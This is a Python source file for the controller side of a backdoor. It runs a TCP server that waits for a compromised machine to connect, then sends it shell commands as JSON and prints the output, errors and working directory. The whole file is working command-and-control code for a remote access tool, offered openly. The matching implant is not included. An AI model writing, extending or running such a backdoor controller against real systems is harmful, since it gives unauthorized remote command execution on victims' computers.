import os
import socket, json

# Default settings for ip and port
DEFAULT_IP      = "192.168.0.16"
DEFAULT_PORT    = 5555


def log_info(text):
    """ print info to terminal"""
    print("[*] {}".format(text))

def log_success(text):
    """ print success info to terminal"""
    print("[+] {}".format(text))

def log_failure(text):
    """log failure to terminal"""
    print("[-] {}".format(text))


class RequestData:
    """
        Hold request data for backdoor.
        Contain method for extracting encoded json for socket send
    """

    # default constructor
    def __init__(self, command, is_request = False):
        self.is_request = is_request    # if true, command is for application, else for shell
        self.command    = command       # command for app or shell

    def jsonEncoded(self) -> bytes:
        """ Method for extracting data as encoded json string """

        jsonData = json.dumps(self, default=lambda x: x.__dict__, sort_keys=True, indent=4)
        return jsonData.encode()

class ResponseData:
    """ Parse and hold response data from json response """

    def __init__(self, responseJson) -> None:
        self.has_output = responseJson["has_output"]
        self.out        = responseJson["out"]
        self.err        = responseJson["err"]
        self.cwd        = responseJson["cwd"]


class BackdoorServer:
    """
        Backdoor server class.
        Set ip and port as args and run
    """

    # default constructor
    def __init__(self, ip, port) -> None:

        # create adress for socet
        self._address = (ip, port)

        # create IPv4, tct socket and bind to adress
        self._SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._SOCK.bind(self._address)

        self._target     = None      # hold target socket
        self._target_ip  = None      # hold target ip adress
        self._target_cwd = None      # hold target current working directory

        self._local_commands = ["clear"]


    # run method for appication
    def run(self):

        print("\n   ---   STARTING BACKDOOR SERVER =>  {}:{}   ---\n".format(self._address[0], self._address[1]))

        # listen for connection
        self._SOCK.listen(5)
        log_info("Waiting for connection...")

        # accept connection from target
        self._target, self._target_ip = self._SOCK.accept()
        log_info("Connecting {}".format(self._target_ip))

        self._first_connect()

        print("\n")

        self._commander()

        self._SOCK.detach()
        self._SOCK.close()
    

    def _commander(self):
        """ handle user inputs and manage commands"""

        while True:

            # get user input
            command = input(" ~{}\n {}> ".format(self._target_ip, self._target_cwd))
        
            # handle exit commands first
            if command in ["exit","quit"]:
                self.disconnect()
                log_info("Disconnected {}".format(self._target_ip))
                break

            # handle bdserver commands (local commands)
            if command.split(" ")[0] == "bdserver":
                self._handle_local_command(command[9:])
                continue

            if command in self._local_commands:
                self._handle_local_command(command)
                continue
            
            # handle shell commands
            self._target_communicate(command)


    def _first_connect(self):
        """ establish first connection to verify, getting backdoor working directory """

        request = RequestData("getcwd", True)
        self._send(request)
        response = self._recive()
        self._target_cwd = response.cwd
        log_success("Connected {}".format(self._target_ip))


    def disconnect(self):
        """ send exit command to shell, also use if app fails """
        request = RequestData("exit", True)
        self._send(request)


    def _target_communicate(self, command):
        """ handle all target communications"""

        # DEV :: check for keywords for application commands

        # send to target shell if no special app command
        self._target_shell_command(command)


    def _target_shell_command(self, command):
        """ handle target shell commands """
        
        request = RequestData(command)
        self._send(request)
        response = self._recive()
        
        print(response.out)
        if (response.err):
            print(response.err)
        self._target_cwd = response.cwd


    def _target_app_request(self, command):
        """ handle target application requests """
        pass

    def _handle_local_command(self, command):
        """ handle local commands"""

        if command == "clear":
            os.system("cls")
            return


    def _send(self, data):
        """transform data object to encoded json string and sends"""
        request = data.jsonEncoded()
        self._target.send(request)


    def _recive(self) -> ResponseData:
        """recive response and parse to object"""
        
        data = ""
        while True:
            try: 
                data += self._target.recv(1024).decode().rstrip()
                data = json.loads(data)
                return ResponseData(data)
            except ValueError:
                continue

                

if __name__ == "__main__":

    server = BackdoorServer(DEFAULT_IP, DEFAULT_PORT)
    server.run()